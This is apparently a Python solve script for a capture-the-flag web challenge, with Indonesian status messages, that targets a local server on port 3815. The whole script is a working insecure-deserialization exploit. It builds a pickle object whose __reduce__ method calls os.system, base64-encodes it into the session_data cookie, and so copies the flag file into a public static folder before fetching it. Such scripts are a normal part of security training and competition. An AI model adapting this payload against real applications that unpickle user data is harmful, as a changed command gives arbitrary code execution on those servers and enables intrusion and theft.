import requests
import base64
import pickle
import os

URL = "http://localhost:3815"

class MaliciousPayload:
    def __reduce__(self):
        cmd = "cp /flag*.txt static/flag.txt"
        return (os.system, (cmd,))

def solve():
    print("[+] Menyusun payload pickle (Insecure Deserialization)...")
    payload_obj = MaliciousPayload()

    serialized_payload = pickle.dumps(payload_obj)
    encoded_payload = base64.b64encode(serialized_payload).decode('utf-8')

    print("[+] Mengirim payload melalui cookie session_data...")
    cookies = {'session_data': encoded_payload}

    requests.get(f"{URL}/", cookies=cookies)

    print("[+] Payload tereksekusi! Mengecek folder static...")

    response = requests.get(f"{URL}/static/flag.txt")

    if "HOLOGY9" in response.text:
        print("[+] SUCCESS! Flag ditemukan:")
        print(response.text.strip())
    else:
        print("[-] Gagal mengekstrak flag.")

if __name__ == "__main__":
    solve()
